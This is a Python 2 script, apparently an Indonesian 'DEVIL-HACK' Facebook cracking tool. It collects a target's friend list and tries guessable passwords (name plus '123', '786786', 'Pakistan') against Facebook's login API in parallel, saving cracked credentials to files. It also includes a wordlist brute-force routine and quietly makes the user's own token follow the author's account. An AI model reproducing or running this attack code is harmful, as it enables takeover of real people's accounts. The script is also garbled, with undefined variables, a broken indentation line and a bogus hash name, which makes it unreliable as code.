#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
—————————————————————————
     ╭━━━━┳━━━┳━╮╱╭┳━━━━┳━━━╮
     ┃╭╮╭╮┃╭━╮┃┃╰╮┃┃╭╮╭╮┃╭━━╯
     ╰╯┃┃╰┫┃╱┃┃╭╮╰╯┣╯┃┃╰┫╰━━╮
     ╱╱┃┃╱┃╰━╯┃┃╰╮┃┃╱┃┃╱┃╭━━╯
     ╱╱┃┃╱┃╭━╮┃┃╱┃┃┃╱┃┃╱┃╰━━╮
     ╱╱╰╯╱╰╯╱╰┻╯╱╰━╯╱╰╯╱╰━━━╯
 [÷] JANGAN LUPA ADD FB GUA BANGSAD [÷]
 [÷] FB : https://m.facebook.com/DEVILS69JAVHD [÷]
——————————————————————————
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("Tunggu Bodoh"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "Not Vuln"
vuln = "Vuln"

os.system("clear")
print  """

╔═══╦═══╦╗──╔╦══╦╗
╚╗╔╗║╔══╣╚╗╔╝╠╣╠╣║
─║║║║╚══╬╗║║╔╝║║║║
─║║║║╔══╝║╚╝║─║║║║─╔╗
╔╝╚╝║╚══╗╚╗╔╝╔╣╠╣╚═╝║
╚═══╩═══╝─╚╝─╚══╩═══╝                       

"""

jalan("\033[1;97m•◈•───────•◈ SELAMAT MALING •◈•───────•◈•")  

jalan("──╔╦═══╦═╗─╔╦═══╦═══╦═══╗")
jalan("──║║╔═╗║║╚╗║╠╗╔╗║╔══╣╔═╗║")
jalan("──║║║─║║╔╗╚╝║║║║║╚══╣╚══╗")
jalan("╔╗║║╚═╝║║╚╗║║║║║║╔══╩══╗║")
jalan("║╚╝║╔═╗║║─║║╠╝╚╝║╚══╣╚═╝║")
jalan("╚══╩╝─╚╩╝─╚═╩═══╩═══╩═══╝")
jalan("  SELAMAT DATANG MONYET  ")
jalan("  JANGAN LUPA COLI DULU BIAR HOKI ")

jalan("•◈•──────────•◈• DEVIL-HACK •◈•──────────•◈•")

CorrectUsername = "javhd"
CorrectPassword = "1878"


loop = 'true'
while (loop == 'true'):
    username = raw_input("[☆] Username >>>> ")
    if (username == CorrectUsername):
    	password = raw_input("[☆] Password >>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.facebook.com/DEVILS69JAVHD')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.facebook.com/DEVILS69JAVHD')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
	print "\033[1;91m>>>\033[1;91m[1]\033[1;93m Login Via Akun Facebook  "
        time.sleep(0.05)
        print "\033[1;91m>>>\033[1;91m[2]\033[1;94m Login Via Token Facebook "
        time.sleep(0.05)        
	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Logout        "
	print("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
	pilih_login()

def pilih_login():
	peak = raw_input("Pilih Yang Lu Suka >>>")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()        
	elif unikers =="3":
		os.system('xdg-open https://github.com/aa1878')
		login()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 50*"▪"
		
		
		print('          [÷] Login Menggunakan Akun Baru [÷]' )
		id = raw_input('        [÷] ID/Email : ')
		pwd = raw_input('         [÷] Password : ')
		tik()
		try:
			br.open('https://www.facebook.com')
		except mechanize.URLError:
			print"Tidak Ada Jaringan Bodoh"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("hak1")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '[✓] Login Berhasil...'
				os.system('xdg-open https://www.facebook.com/DEVILS69JAVHD')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"[!] Tidak Ada Jaringan Bodoh"
				keluar()
		if 'checkpoint' in url:
			print("[!] Akun Lu Checkpoint Bego")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("Password/Email Salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("[÷] Token : Masukan Toket Gedemu Disini >> ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "[!] Salah"
		e = raw_input("[?] Toket Yang Anda Masukan Terlalu Kecil? [y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Tidak valid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"Akun Lu Checkpoint Bego"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"Tidak Ada Jaringan Bodoh"
		keluar()
	os.system("clear")
	print logo
	print "         ╔═════════════════════════════════╗"
	print "            [÷] Nama "+nama+"  	                                                     "                               
	print "            [÷] ID  : "+id+"                                                                      "
	print "         ╚═════════════════════════════════╝"
	print "[1] >> Mulai Maling"
	print "[0] >> Keluar"
	pilih()

def pilih():
	unikers = raw_input(">>> ")
	if unikers =="":
		print "Isi dengan Benar"
		pilih()
	elif unikers =="1":
		os.system('clear')
		print logo
		print " [÷]═════════DEVIL-HACK═════════[÷]\n"
		os.system('git pull the original master')
		raw_input('Kembali ')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "Isi dengan benar"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"Token tidak valid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	os.system('clear')
	print logo
	print "⊱⋕⊰══════════════════⊱⋕⊰\n" 
	print ("[1] >> Crack Publik")
	print "⊱⋕⊰══════════════════⊱⋕⊰\n" 
	pilih_super()

def pilih_super():
	peak = raw_input(">>> ")
	if peak =="":
		print "Isi dengan benar"
		pilih_keren()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("[÷] Masukan ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[÷] Nama : "+op["nama"]
		except KeyError:
			print"[÷] ID Tidak ditemukan!"
			raw_input("Kembali")
			keren()
		print"[÷] Mengumpulkan ID..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		
print logo2
	print " [÷] Total Target Maling : "+str(len(id))
	jalan('[÷] Tunggu Sebentar Bodoh...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("[÷] Maling"+o),;sys.stdout.flush();time.sleep(1)
	print "        ❈   Berhenti Maling Tekan > CTRL+Z    ❈"
	print "   ══════════════════◄►══════════════════💋●"
	jalan('                TUNGGU BODOH SEDANG MALING...')
	print  "  ══════════════════◄►══════════════════💋●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass1 + ' 👽 ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass1 + ' 👽 ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass2 + ' 👽 ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass2 + ' 👽 ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass3 + ' 👽 ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass4 + ' 👽 ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass4 + ' 👽 ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name'] + '123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	
	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;97m....'
	print "\033[1;32;40m[+] Total OK/\033[1;97mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
	print """
\033[1;31;40m ●════════════════════════◄►════════════════════════●
           """
	raw_input("\n\033[1;97m[\033[1;97mExit\033[1;97m]")
	super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;97m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
        try:
            email = raw_input('\033[1;97m[+] \033[1;97mID\033[1;97m/\033[1;97mEmail \033[1;97mTarget \033[1;97m:\033[1;97m ')
            passw = raw_input('\033[1;97m[+] \033[1;97mWordlist \033[1;97mext(list.txt) \033[1;97m: \033[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
            print '\033[1;97m[\033[1;97m\xe2\x9c\x93\033[1;97m] \033[1;97mTarget \033[1;97m:\033[1;97m ' + email
            print '\033[1;97m[+] \033[1;97mTotal\033[1;97m ' + str(len(total)) + ' \033[1;97mPassword'
            jalan('\033[1;97m[\xe2\x9c\xba] \033[1;97mPlease wait \033[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[1;97m[\033[1;97m\xe2\x9c\xb8\033[1;97m] \033[1;97mTry \033[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\033[1;97m[+] \033[1;97mFounded.'
                        print 52 * '\033[1;97m\xe2\x95\x90'
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;97m:\033[1;97m ' + email
                        print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;97m:\033[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\033[1;97m[+] \033[1;97mFounded.'
                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                            print '\033[1;97m[!] \033[1;97mAccount Maybe Checkpoint'
                            print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;97m:\033[1;97m ' + email
                            print '\033[1;97m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;97m:\033[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\033[1;97m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\033[1;97m[!] File not found...'
            print """\n\033[1;97m[!] \033[1;97mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	login()
